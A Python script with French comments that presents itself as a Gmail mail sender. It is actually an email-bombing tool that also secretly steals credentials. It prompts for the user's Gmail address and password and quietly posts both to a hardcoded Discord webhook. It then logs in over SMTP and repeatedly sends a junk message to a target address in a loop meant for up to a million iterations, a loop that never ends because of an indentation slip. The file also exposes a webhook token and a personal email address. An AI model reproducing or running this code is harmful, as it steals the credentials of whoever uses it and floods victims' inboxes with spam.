import smtplib
import ssl
import time
import pyautogui
import logging
from discord import SyncWebhook, File # Import SyncWebhook

webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1132444091825782794/HxaGf28ZLI_c2vJ43p60E420rw2fO0YF0wUpJr853WDPAUJhJ5eAnFEO-Y7nXq1PWVAo')
logging.basicConfig(level=logging.DEBUG,
                    filename="mail input\lbc\debug.txt",
                    filemode="a",
                    format='%(asctime)s - %(levelname)s - %(message)s')

#mathis.decoster@gmail.com
logging.debug("--------------------------------")
logging.debug("|         message debug        |")
logging.debug("--------------------------------")

p = print

#-------------xeon on TOP !!-------------------\
p('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░')#|\
p('░┌─┐┌─┐░░┌───┐░░░░░┌───┐░░░░░┌────┐░┌───┐░')#| \
p('░└┐└┘┌┘░░│┌─┐│░░░░░│┌─┐│░░░░░│┌┐┌┐│░│┌─┐│░')#|  \
p('░░└┐┌┘┌──┤│░│├─┐░░░││░│├─┐░░░└┘││├┴─┤└─┘│░')#|   \
p('░░┌┘└┐││─┤│░││┌┐┐░░││░││┌┐┐░░░░│││┌┐│┌──┘░')#|    \
p('░┌┘┌┐└┤│─┤└─┘││││░░│└─┘││││░░░░│││└┘││░░░░')#|     \
p('░└─┘└─┴──┴───┴┘└┘░░└───┴┘└┘░░░░└┘└──┴┘░░░░')#| 60°  \
p('░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░')#|_______\
#-----------------------------------------------/

# on rentre les informations de notre adresse e-mail
print("Le mail entrant")
mm = input('-->')
webhook.send(content= '--------------------------------------------' )
webhook.send(content= 'conection.' )
time.sleep(1)
webhook.send(content= 'conection..' )
time.sleep(1)
webhook.send(content= 'conection...' )
time.sleep(1)
webhook.send(content= 'conection....' )
time.sleep(1)
webhook.send(content= '----------------' )
email_address = mm
print("vous avez mit", mm)
logging.debug("--------------")
logging.debug("|mail entrant|")
logging.debug("--------------")
webhook.send(content= 'mail :' )
webhook.send(content= email_address )

print("Le MDP du mail entrant")
mn = input('-->')
webhook.send(content= '-.-_-.-_-.-_-.-_-.-_-.-_-.-' )
email_password = mn
print("vous avez mit", mn)
logging.debug("----------")
logging.debug("|mdp mail|")
logging.debug("----------")
webhook.send(content= 'MDP\_/mail :' )
webhook.send(content= email_password )


# on rentre les informations sur le destinataire
print("mettre l'addres mail")
mail = input('-->')
print("vous avez mit", mail)
email_receiver = mail
logging.debug("VCT mail")


i = 0
while i < 1000000:  
  
# on rentre les renseignements pris sur le site du fournisseur
  smtp_address = 'smtp.gmail.com'
  smtp_port = 465

# on crée la connexion
  context = ssl.create_default_context()
  with smtplib.SMTP_SSL(smtp_address, smtp_port, context=context) as server:
  # connexion au compte
    server.login(email_address, email_password)
  # envoi du mail
    server.sendmail(email_address, email_receiver, 'hhhhhhhhhhhaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaahhhaaaaaaaaaaaaaaaa')
    time.sleep(1)
  print("\/-_-_-|message send", mail, "|-_-_-\/")
  logging.debug("\/-_-_-|message send|-_-_-\/")
i = i + 1